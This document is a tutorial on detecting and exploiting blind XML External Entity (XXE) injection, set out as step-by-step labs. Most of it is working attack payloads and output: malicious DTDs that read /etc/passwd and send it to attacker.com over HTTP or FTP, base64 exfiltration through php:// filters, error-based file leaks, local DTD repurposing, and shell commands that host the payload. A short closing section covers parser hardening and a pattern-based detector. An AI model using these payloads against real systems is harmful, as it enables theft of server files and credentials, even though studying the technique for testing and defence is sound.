# Finding and Exploiting Blind XXE Vulnerabilities

Blind XXE vulnerabilities occur when an application is vulnerable to XML External Entity injection but does not return the values of defined external entities in its responses, making direct file retrieval impossible through standard XXE techniques. Unlike regular XXE where file contents appear directly in application responses, blind XXE requires sophisticated out-of-band techniques to confirm exploitation and exfiltrate data. Attackers exploit blind XXE through two primary methods: triggering out-of-band network interactions to attacker-controlled systems (DNS lookups, HTTP requests) to exfiltrate data via URL parameters, and inducing XML parsing errors that leak sensitive information in error messages. These techniques often require hosting malicious DTDs externally or repurposing local DTD files already present on the target system.

The blind challenge: **you can inject XXE payloads, but you can't see the results directly**—exploitation requires creative side-channel techniques.

## What is blind XXE?

### Blind vs. regular XXE comparison

**Regular XXE (response visible):**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

**Response:**
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**File contents directly visible!**

**Blind XXE (response not visible):**
```http
POST /submit-feedback HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<feedback>
    <name>&xxe;</name>
    <message>Test</message>
</feedback>
```

**Response:**
```
Thank you for your feedback!
```

**Generic message—no entity content shown.**

### Why blind XXE occurs

**Common scenarios:**

**Scenario 1: Response discarded**
```python
def process_feedback(xml_input):
    tree = ET.fromstring(xml_input)
    
    # Extract data (external entities resolved here)
    name = tree.find('name').text
    message = tree.find('message').text
    
    # Store in database
    save_feedback(name, message)
    
    # Generic response (doesn't return processed data)
    return "Thank you for your feedback!"
```

**Scenario 2: Background processing**
```python
def submit_xml_report(xml_input):
    # Parse XML (entities resolved)
    tree = ET.fromstring(xml_input)
    
    # Queue for background processing
    queue.add_job('process_report', tree)
    
    # Immediate response (before processing complete)
    return "Report submitted successfully"
```

**Scenario 3: Logged but not displayed**
```python
def log_user_activity(xml_input):
    tree = ET.fromstring(xml_input)
    
    # Extract data (entities resolved)
    activity = tree.find('activity').text
    
    # Log to file (not returned to user)
    logger.info(f"Activity: {activity}")
    
    return "Activity logged"
```

**Scenario 4: Error suppression**
```python
def process_xml(xml_input):
    try:
        tree = ET.fromstring(xml_input)
        # Process data...
    except Exception as e:
        # Errors suppressed
        return "Processing complete"
    
    return "Success"
```

### Challenge of blind XXE

**Detection difficulties:**
- Cannot see if file was read successfully
- Cannot see file contents in response
- Cannot see SSRF responses from internal systems
- Cannot confirm if payload triggered

**Exploitation difficulties:**
- Direct data retrieval impossible
- Must use indirect methods
- Requires external infrastructure (attacker-controlled server)
- More time-consuming than regular XXE

## Detecting blind XXE using out-of-band techniques

### Technique 1: Basic out-of-band detection with general entities

**Concept:** Make server perform DNS lookup or HTTP request to attacker-controlled domain.

**Setup: Burp Collaborator or similar**
```
Burp Suite → Burp menu → Burp Collaborator client
Click "Copy to clipboard"
Result: unique-id.burpcollaborator.net
```

**Payload:**
```http
POST /submit-feedback HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<feedback>
    <name>&xxe;</name>
    <message>Test</message>
</feedback>
```

**What happens:**
```
1. XML parser encounters &xxe; entity
2. Resolves external entity: http://unique-id.burpcollaborator.net
3. Makes DNS lookup for unique-id.burpcollaborator.net
4. Makes HTTP GET request to http://unique-id.burpcollaborator.net
5. Application returns generic response
```

**Check Burp Collaborator:**
```
Poll now → Results:

[+] DNS lookup from 203.0.113.50
    A query for unique-id.burpcollaborator.net
    
[+] HTTP request from 203.0.113.50
    GET / HTTP/1.1
    Host: unique-id.burpcollaborator.net
    User-Agent: Java/11.0.1
    Connection: keep-alive
```

**Blind XXE confirmed!**

#### Lab: Blind XXE with out-of-band interaction

**Scenario:** Feedback submission form accepts XML but doesn't display processed data.

**Step 1: Normal request**
```http
POST /feedback/submit HTTP/1.1

<?xml version="1.0"?>
<feedback>
    <name>John</name>
    <email>john@example.com</email>
    <subject>Question</subject>
    <message>When will product X be available?</message>
</feedback>
```

**Response:**
```
Feedback submitted successfully
```

**Step 2: Test for XXE with Collaborator**
```http
POST /feedback/submit HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://unique-id.burpcollaborator.net"> ]>
<feedback>
    <name>&xxe;</name>
    <email>john@example.com</email>
    <subject>Question</subject>
    <message>Test</message>
</feedback>
```

**Step 3: Poll Collaborator**
```
[+] DNS lookup - unique-id.burpcollaborator.net
[+] HTTP GET / from 203.0.113.50
```

**Blind XXE vulnerability confirmed!**

### Technique 2: Out-of-band detection with parameter entities

**Why parameter entities?**

Sometimes general entities are blocked:
```python
# Blocked by input validation
if '<!ENTITY' in xml_input and 'SYSTEM' in xml_input:
    return "Blocked: suspicious XML pattern"
```

**Parameter entities might bypass filters because:**
- Different syntax: `<!ENTITY % name>` vs `<!ENTITY name>`
- Only valid in DTD context
- Less commonly filtered

**Parameter entity syntax:**
```xml
<!ENTITY % name "value">
```

**Usage:** `%name;` (not `&name;`)

**Payload:**
```http
POST /submit-feedback HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [ 
    <!ENTITY % xxe SYSTEM "http://unique-id.burpcollaborator.net"> 
    %xxe;
]>
<feedback>
    <name>Test</name>
</feedback>
```

**Key difference:** `%xxe;` invoked within DTD, not in document content.

**Execution flow:**
```
1. Parser processes DTD
2. Encounters %xxe; parameter entity
3. Resolves SYSTEM "http://unique-id.burpcollaborator.net"
4. Makes DNS lookup and HTTP request
5. Continues parsing document
```

**Collaborator receives interaction—blind XXE confirmed!**

#### Lab: Blind XXE with out-of-band interaction via XML parameter entities

**Scenario:** Application blocks general entities but allows parameter entities.

**Step 1: Test general entity (blocked)**
```http
POST /submit HTTP/1.1

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
<data>&xxe;</data>
```

**Response:**
```
Error: Entities not allowed
```

**Step 2: Test parameter entity (success)**
```http
POST /submit HTTP/1.1

<!DOCTYPE foo [ 
    <!ENTITY % xxe SYSTEM "http://unique-id.burpcollaborator.net"> 
    %xxe;
]>
<data>test</data>
```

**Response:**
```
Success
```

**Collaborator:**
```
[+] DNS lookup from target
[+] HTTP request from target
```

**Bypass successful using parameter entities!**

### DNS-only vs. HTTP detection

**DNS-only interaction (common):**
```
Collaborator results:
[+] DNS lookup for unique-id.burpcollaborator.net from 203.0.113.50
[ ] No HTTP request received
```

**Why?**
```
Network architecture:
- Outbound DNS allowed (port 53)
- Outbound HTTP blocked by firewall (ports 80/443)

XML parser behavior:
1. Resolves DNS for hostname (succeeds)
2. Attempts HTTP connection (blocked by firewall)
3. Connection timeout
```

**Still indicates XXE vulnerability!** DNS lookup alone proves external entity resolution works.

**Full HTTP interaction (ideal):**
```
Collaborator results:
[+] DNS lookup for unique-id.burpcollaborator.net
[+] HTTP GET request from 203.0.113.50
    User-Agent: Java/11.0.1
```

Indicates both DNS and HTTP are allowed—better for data exfiltration.

## Exploiting blind XXE to exfiltrate data out-of-band

### The challenge

**Cannot see file contents in response:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

**Response:**
```
Success (no file contents shown)
```

**Solution:** Make server send file contents to attacker's server via HTTP request.

### Technique: External DTD with parameter entity chaining

**Attack architecture:**
```
1. Attacker hosts malicious DTD on their server
2. Victim's XML references attacker's DTD
3. Malicious DTD reads sensitive file
4. Malicious DTD exfiltrates file contents via HTTP to attacker
5. Attacker receives data in HTTP logs
```

**Step 1: Create malicious DTD**

**File: malicious.dtd (hosted on attacker.com)**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/steal?data=%file;'>">
%eval;
%exfiltrate;
```

**Step 2: Host malicious DTD**
```bash
# Simple Python HTTP server
echo '<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '\''http://attacker.com:8000/steal?data=%file;'\''>">
%eval;
%exfiltrate;' > malicious.dtd

python3 -m http.server 80
```

**Step 3: Inject payload referencing external DTD**
```http
POST /submit-feedback HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
    %xxe;
]>
<feedback>
    <name>Test</name>
</feedback>
```

**Execution flow:**

**Phase 1: Load external DTD**
```
1. Parser encounters %xxe; in victim's DTD
2. Fetches http://attacker.com/malicious.dtd
3. Parser processes malicious.dtd content
```

**Phase 2: Define entities**
```
From malicious.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
Reads /etc/passwd, stores in %file;

<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/steal?data=%file;'>">
Defines %eval; which creates %exfiltrate; entity

%eval;
Executes %eval;, creating %exfiltrate; entity
```

**Phase 3: Exfiltrate**
```
From malicious.dtd:

%exfiltrate;
Makes HTTP request:
GET /steal?data=root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin... HTTP/1.1
Host: attacker.com
```

**Attacker's server logs:**
```bash
203.0.113.50 - - [18/Feb/2026 19:37:01] "GET /malicious.dtd HTTP/1.1" 200 -
203.0.113.50 - - [18/Feb/2026 19:37:02] "GET /steal?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin%0A... HTTP/1.1" 200 -
```

**Success!** /etc/passwd contents received in URL parameter.

#### Lab: Exploiting blind XXE to exfiltrate data using malicious external DTD

**Scenario:** Stock checker accepts XML but doesn't return entity values.

**Step 1: Setup exploit server**
```bash
# Create malicious.dtd
cat > malicious.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/exfil?x=%file;'>">
%eval;
%exfiltrate;
EOF

# Host on port 80
sudo python3 -m http.server 80
```

**Step 2: Inject payload**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
    %xxe;
]>
<stockCheck>
    <productId>1</productId>
</stockCheck>
```

**Step 3: Check server logs**
```
[+] GET /malicious.dtd - 200
[+] GET /exfil?x=web-server-01 - 200
```

**Hostname exfiltrated: web-server-01**

**Step 4: Escalate to /etc/passwd**
```xml
<!-- Update malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/exfil?x=%file;'>">
%eval;
%exfiltrate;
```

**Rerun attack, receive /etc/passwd in logs.**

### Understanding parameter entity encoding

**Why `&#x25;`?**

In the malicious DTD:
```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://...'>">
```

**`&#x25;` = `%` character (URL encoded)**

**Why needed:**
```
Cannot write:
<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://...'>">
                          ^
                          Parser error: Cannot nest % directly

Must write:
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://...'>">
                          ^
                          &#x25; = % (escaped, parsed later)
```

**Execution:**
```
Step 1: Define %eval;
Content: "<!ENTITY &#x25; exfiltrate SYSTEM ...>"

Step 2: Invoke %eval;
Parser substitutes %eval; with its value

Step 3: Parse substituted content
&#x25; becomes %
Result: <!ENTITY % exfiltrate SYSTEM ...>
Creates new %exfiltrate; entity

Step 4: Invoke %exfiltrate;
Makes HTTP request
```

### Dealing with problematic characters

**Problem: Newlines in /etc/passwd**
```
/etc/passwd contains:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**HTTP GET with newlines:**
```
GET /exfil?x=root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin... HTTP/1.1

Parser error: Invalid URL (newlines not allowed in URLs)
```

**Solution 1: Use FTP instead of HTTP**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfiltrate;
```

**FTP allows newlines in paths.**

**Setup FTP server:**
```python
# Simple FTP logger
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

class LoggingHandler(FTPHandler):
    def on_file_received(self, file):
        print(f"[+] Received: {file}")

handler = LoggingHandler
handler.authorizer = DummyAuthorizer()
handler.authorizer.add_anonymous(".")

server = FTPServer(("0.0.0.0", 21), handler)
server.serve_forever()
```

**Solution 2: Target files without newlines**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
```

**/etc/hostname usually single line:**
```
web-server-01
```

**Works perfectly in HTTP URL.**

**Solution 3: Base64 encode (if php:// wrapper available)**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Exfiltrated data:**
```
GET /?x=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246... HTTP/1.1
```

**Base64-encoded—no newline issues!**

**Decode:**
```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo..." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Exploiting blind XXE to retrieve data via error messages

### The technique

**Concept:** Trigger XML parsing error that includes file contents in error message.

**If application displays error messages:**
```python
try:
    tree = ET.fromstring(xml_input)
except Exception as e:
    return f"XML parsing error: {str(e)}", 500
```

**Attacker can trigger errors containing sensitive data.**

### Error-based exfiltration method

**Step 1: Create malicious DTD**

**malicious.dtd on attacker.com:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Step 2: Inject payload**
```http
POST /submit HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">
    %xxe;
]>
<data>test</data>
```

**Execution flow:**

**Phase 1: Load malicious DTD**
```
Parser fetches http://attacker.com/malicious.dtd
```

**Phase 2: Read file**
```
<!ENTITY % file SYSTEM "file:///etc/passwd">

%file; contains:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Phase 3: Create error entity**
```
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;

Creates %error; entity that references:
file:///nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...
```

**Phase 4: Trigger error**
```
%error;

Attempts to load file:///nonexistent/root:x:0:0:root:/root:/bin/bash...
This file doesn't exist → Error thrown
```

**Response:**
```
HTTP/1.1 500 Internal Server Error

XML parsing error: java.io.FileNotFoundException: 
/nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Success!** /etc/passwd contents leaked via error message.

#### Lab: Exploiting blind XXE to retrieve data via error messages

**Scenario:** Application displays XML parsing errors.

**Step 1: Host malicious DTD**
```bash
cat > error.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
EOF

python3 -m http.server 80
```

**Step 2: Submit payload**
```http
POST /product/stock HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd">
    %xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**Step 3: Receive error with data**
```
HTTP/1.1 400 Bad Request

Error parsing XML: java.io.FileNotFoundException: 
/nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**File successfully extracted via error message!**

### Alternative error techniques

**Technique 1: Invalid URI characters**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://invalid-url/%file;'>">
%eval;
%error;
```

**Error:**
```
Invalid URI: http://invalid-url/root:x:0:0:root:/root:/bin/bash...
```

**Technique 2: Type mismatch errors**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://[%file;]/'>">
%eval;
%error;
```

**If hostname = "web-server-01":**

**Error:**
```
Invalid IPv6 address: [web-server-01]
```

## Exploiting blind XXE by repurposing local DTD

### The scenario

**Problem: Out-of-band connections blocked**
```
Firewall rules:
- Block outbound HTTP/HTTPS
- Block outbound DNS (except to internal DNS)
- Block outbound FTP

Cannot:
- Load external DTD from attacker's server
- Exfiltrate via HTTP callbacks
- Exfiltrate via DNS
```

**Traditional blind XXE fails.**

### The loophole: Hybrid DTD redefinition

**XML specification quirk:**
```
Internal DTD restriction:
- Cannot define parameter entity using another parameter entity
- <!ENTITY % b "<!ENTITY % c ...>"> ❌ Not allowed

External DTD permission:
- CAN define parameter entity using another parameter entity
- <!ENTITY % b "<!ENTITY % c ...>"> ✓ Allowed

Hybrid DTD loophole:
- Internal DTD can REDEFINE entities from external DTD
- When redefined, external DTD rules apply
- <!ENTITY % external_entity "new_value"> ✓ Allowed
```

**Attack strategy:**
1. Find local DTD file on server filesystem
2. Identify entity defined in that DTD
3. Redefine that entity with malicious payload
4. Invoke local DTD (loads from filesystem, no network needed)
5. Redefined entity triggers error with data

### The technique

**Step 1: Locate local DTD file**

**Common DTD locations:**

**Linux:**
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/schema/xml-core/catalog.xml
/usr/share/sgml/docbook/xml-dtd-4.2/docbookx.dtd
```

**Windows:**
```
C:\Windows\System32\wbem\xml\cim20.dtd
C:\Program Files\Java\jdk1.8.0_XXX\jre\lib\dtd\
```

**Test for existence:**
```http
POST /submit HTTP/1.1

<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %local_dtd;
]>
<data>test</data>
```

**If file exists:**
```
Response: Success (or specific error)
```

**If file doesn't exist:**
```
Response: FileNotFoundException: /usr/share/yelp/dtd/docbookx.dtd
```

**Step 2: Obtain copy of DTD file**

**For open-source systems:**
```bash
# Download common DTD
wget http://www.oasis-open.org/docbook/xml/4.2/docbookx.dtd

# Review for redefable entities
grep "<!ENTITY" docbookx.dtd
```

**Look for parameter entities:**
```xml
<!-- docbookx.dtd excerpt -->
<!ENTITY % ISOamsa PUBLIC "..." "...">
<!ENTITY % ISOamsb PUBLIC "..." "...">
...
```

**Step 3: Craft exploit payload**

**Assuming /usr/share/yelp/dtd/docbookx.dtd contains:**
```xml
<!ENTITY % ISOamso PUBLIC "..." "isoamso.ent">
```

**Exploit payload:**
```http
POST /submit HTTP/1.1

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    
    %local_dtd;
]>
<data>test</data>
```

**Execution flow:**

**Phase 1: Define local DTD entity**
```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

Prepares to load local DTD file
```

**Phase 2: Redefine ISOamso entity**
```
<!ENTITY % ISOamso '...'>

Redefines %ISOamso; entity (originally in docbookx.dtd)
New value contains error-based XXE payload
```

**Phase 3: Load local DTD**
```
%local_dtd;

Loads /usr/share/yelp/dtd/docbookx.dtd
DTD contains: <!ENTITY % ISOamso "...">
But %ISOamso; already redefined in internal DTD
Internal DTD takes precedence
```

**Phase 4: Process redefined entity**
```
From redefined %ISOamso;:

<!ENTITY % file SYSTEM "file:///etc/passwd">
Reads /etc/passwd

<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
Creates error entity

%eval;
Defines %error;

%error;
Triggers error with file contents
```

**Response:**
```
HTTP/1.1 500 Internal Server Error

XML Error: java.io.FileNotFoundException:
/nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Success!** File contents extracted without any network connection.

### Understanding entity encoding in exploit

**Complex encoding in payload:**
```xml
<!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
'>
```

**Encoding breakdown:**

| Encoded | Character | Why encoded |
|---------|-----------|-------------|
| `&#x25;` | `%` | Escape parameter entity marker |
| `&#x26;#x25;` | `&#x25;` | Double-escaped % (becomes `&#x25;` after first parsing) |
| `&#x27;` | `'` | Escape single quote inside single-quoted string |

**Parsing stages:**

**Stage 1: Parse internal DTD**
```xml
<!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    ...
'>
```

Stores as string (entities not yet resolved).

**Stage 2: Invoke %local_dtd;**
```
Loads docbookx.dtd
Attempts to define %ISOamso;
Already defined—uses internal definition
```

**Stage 3: Process %ISOamso; value**
```
&#x25; → %
&#x26;#x25; → &#x25;
&#x27; → '

Result:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Stage 4: Execute payload**
```
%file; reads /etc/passwd
%eval; creates %error;
%error; triggers error with file contents
```

### Finding suitable DTD files

**Enumeration technique:**

**Create list of common DTD paths:**
```bash
cat > dtd_list.txt << 'EOF'
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/sgml/docbook/xml-dtd-4.2/docbookx.dtd
/etc/xml/catalog
EOF
```

**Test each with Burp Intruder:**
```http
POST /submit HTTP/1.1

<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file://§/usr/share/yelp/dtd/docbookx.dtd§">
    %local_dtd;
]>
<data>test</data>
```

**Payload positions:** DTD file paths from list

**Identify hits:**
```
Path: /usr/share/yelp/dtd/docbookx.dtd
Response: Success (no error)
→ File exists!

Path: /usr/share/xml/fontconfig/fonts.dtd
Response: FileNotFoundException
→ File doesn't exist
```

**Obtain DTD file for analysis:**
```bash
# For common open-source DTDs
# Search online for public copies
# Example: DocBook DTD
wget https://docbook.org/xml/4.2/docbookx.dtd

# Identify redefable entities
grep "<!ENTITY %" docbookx.dtd | head -20
```

**Choose entity to redefine:**
```xml
<!-- Look for parameter entities -->
<!ENTITY % ISOamso "...">  ✓ Good candidate
<!ENTITY % common.attrib "...">  ✓ Good candidate
```

### Platform-specific DTD files

**Linux (GNOME):**
```
/usr/share/yelp/dtd/docbookx.dtd
Entity to redefine: %ISOamso;
```

**Linux (various):**
```
/usr/share/xml/fontconfig/fonts.dtd
Entity to redefine: %expr;
```

**Windows (WMI):**
```
C:\Windows\System32\wbem\xml\cim20.dtd
Entity to redefine: %SystemClass;
```

**Java applications:**
```
file:///usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd
Entity to redefine: %Body;
```

## Complete attack demonstration

### Full blind XXE exploitation

**Target:** Feedback form that doesn't return entity values.

**Phase 1: Detection**

**Test with Burp Collaborator:**
```http
POST /feedback HTTP/1.1

<!DOCTYPE foo [ 
    <!ENTITY % xxe SYSTEM "http://unique-id.burpcollaborator.net"> 
    %xxe;
]>
<feedback><name>Test</name></feedback>
```

**Collaborator receives DNS + HTTP → Blind XXE confirmed**

**Phase 2: Data exfiltration setup**

**Create malicious.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:8000/?x=%file;'>">
%eval;
%exfil;
```

**Host DTD:**
```bash
python3 -m http.server 8000
```

**Phase 3: Exfiltrate hostname**
```http
POST /feedback HTTP/1.1

<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com:8000/malicious.dtd">
    %xxe;
]>
<feedback><name>Test</name></feedback>
```

**Server logs:**
```
[+] GET /malicious.dtd - 200
[+] GET /?x=web-server-01 - 200
```

**Hostname obtained: web-server-01**

**Phase 4: Escalate to sensitive files**

**Update malicious.dtd for base64-encoded /etc/passwd:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:8000/exfil?data=%file;'>">
%eval;
%exfil;
```

**Rerun attack:**
```
[+] GET /exfil?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb2... - 200
```

**Decode:**
```bash
echo "cm9vdDp4OjA6MDpyb290..." | base64 -d
root:x:0:0:root:/root:/bin/bash
...
```

**Success!**

## Prevention strategies

### Defense Layer 1: Disable external entities

**Python (defusedxml):**
```python
from defusedxml import ElementTree as ET

# Secure by default
tree = ET.fromstring(xml_input)
```

**Java:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

### Defense Layer 2: Network egress filtering

**Block outbound connections:**
```
Firewall rules:
- Block outbound HTTP/HTTPS (except to specific APIs)
- Block outbound DNS (except to internal DNS)
- Block outbound FTP
- Monitor for unusual outbound connections
```

### Defense Layer 3: Input validation

**Detect XXE patterns:**
```python
def is_safe_xml(xml_string):
    dangerous = [
        '<!DOCTYPE',
        '<!ENTITY',
        'SYSTEM',
        'PUBLIC',
        '<!ENTITY %'
    ]
    
    for pattern in dangerous:
        if pattern in xml_string:
            logger.warning(f"Suspicious XML pattern: {pattern}")
            return False
    
    return True
```

### Defense Layer 4: Error handling

**Don't expose detailed errors:**
```python
try:
    tree = ET.fromstring(xml_input)
except Exception as e:
    # Log full error internally
    logger.error(f"XML parsing error: {e}")
    
    # Return generic error to user
    return "Invalid XML format", 400  # Don't expose details
```
